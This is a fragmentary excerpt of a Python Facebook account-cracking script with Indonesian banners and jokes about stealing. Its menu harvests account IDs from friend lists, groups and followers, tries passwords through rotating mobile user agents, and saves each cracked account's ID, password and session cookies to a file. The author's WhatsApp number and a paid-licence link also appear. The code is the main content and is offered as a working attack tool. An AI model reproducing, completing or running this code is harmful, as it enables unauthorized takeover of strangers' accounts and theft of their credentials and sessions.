...
except:ugen = ['Mozilla/5.0 (Linux; Android 9; vivo 1904) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36','NokiaX2-01/5.0 (07.10) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530','Mozilla/5.0 (Linux; Android 5.1.1; A37fw Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36','Mozilla/5.0 (Linux; U; Android 6.0; en-US; vivo 1713 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/11.5.0.1015 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.11 Mobile Safari/537.36']
...
def banner():
	clear()
	wel = '# SCRIPT ALGIGN CRACK FACEBOOK'
	wel2 = mark(wel, style='cyan')
	sol().print(wel2)
	au=' ███████╗██╗      █████╗ ███╗   ███╗███████╗\n ██╔════╝██║     ██╔══██╗████╗ ████║██╔════╝\n █████╗  ██║     ███████║██╔████╔██║█████╗\n ██╔══╝  ██║     ██╔══██║██║╚██╔╝██║██╔══╝\n ██║     ███████╗██║  ██║██║ ╚═╝ ██║███████╗\n ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝\n ALGI-CODE  \n'
	pengembang1=nel(au,style="blue")
	cetak(nel(pengembang1, title='FOLLOW FB AING DONG @Algi fari_ '))
...
def login_lagi():
	banner()
	sky = '# MASUKKAN TOKEN FACEBOOK ANDA'
...
def menu():
	...
	io = '\x1b[1;92m[01] crack from public friendship\n\x1b[1;92m[02] crack id from public account (massal) \n\x1b[1;92m[03] crack from group all\n\x1b[1;92m[04] bot share fb\n\x1b[1;92m[05] crack from facebook followers\n\x1b[1;92m[06] check crack results\n\x1b[1;92m[07] change user agent\n\033\x1b[1;92m[08] check crack results\n[00] go out'
	oi = nel(io, style='cyan')
	cetak(nel(oi, title='MENU OPTIONS'))
	jh = input(x+'['+p+'•'+x+'] Select : ')
	if jh in ['1','01']:
		dump_publik()
	elif jh in ['2','02']:		
		dump_massal()
		...
		print(x+'['+h+'•'+x+'] Wait for me ...')
		time.sleep(1)
		sw = '# SUCCESS OUT'
		sol().print(mark(sw, style='green'))
		exit()
	else:
		ric = '# NIAT CRACK GAK SI'
...
def dump_massal():
	...
	for userr in uid:
		try:
			...
			sol().print(lo, style='cyan')
			exit()
	tot = '# TOTAL 👉👌%s ID, SMGA SUKSES MALINGNYA'%(len(id))
	if len(id)==0:
...
def setting():
	...
	ioz = '[01] Method B-Api Air\n[02] Method Mobile Entod\n[03] Methode Mbasic Skin'
...
def passwrd():
	ler = '# SHOLAT & ISTIGHFAR DLU SBLM MALING BIAR BERKAH '
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s ALGI %s/%s <-> ALGI:%s <-> ×:%s <-> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no'in taplikasi:
					...
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('LIVE/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='NO SESI'))
...
{P}[•]{B}----------------------------------------------------{P}[•]
{B} |
{P}[•] AUTHOR : ALGI X CODE
{P}[•] WHATSAPP : 081355337827
	{B}[•] FACEBOOK : Algi x Code""")
def licensi():#line:42
  try :#line:43
    os .system ('clear')
    kontol()
...
""")#line:49
    ...
    if OOO00O0OOO00OO00O in ['1','01']:#line:51
      print (f"{H}[{P}!{H}]{P} Anda Akan Diarahkan Ke Whatsapp...");time .sleep (3 );os .system ('xdg-open https://wa.me/6281355337827?text=Bang+Danzz+Beli+Lisensi');exit ()#line:52
...
def run(link, token):
    ...
    while True:
        ...
        headers = {
            ...
            'user-agent': 'Mozilla/5.0 (NokiaC5-00)UC AppleWebkit(like Gecko) Safari/530',
            
            'user-agent': 'NokiaX2-01/5.0 (07.10) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
